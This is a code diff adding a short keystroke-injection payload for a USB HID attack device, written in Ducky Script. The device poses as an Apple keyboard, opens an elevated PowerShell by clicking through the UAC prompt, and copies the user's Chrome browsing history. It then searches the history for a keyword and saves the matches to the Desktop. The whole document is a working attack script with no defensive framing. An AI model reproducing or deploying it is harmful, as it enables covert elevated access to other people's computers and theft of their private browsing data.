@@ -1,1 +1,14 @@
-
+ID 05ac:021e
+DELAY 2000
+GUI r
+DELAY 500
+STRING powershell
+CTRL SHIFT ENTER
+DELAY 1500
+LEFT
+ENTER
+DELAY 1500
+STRING copy "$env:LocalAppData\Google\Chrome\User Data\Default\History" "$env:TEMP\h"
+ENTER
+STRING Select-String -Path "$env:TEMP\h" -Pattern "deinKeyword" | Out-File "$env:USERPROFILE\Desktop\ergebnis.txt"
+ENTER
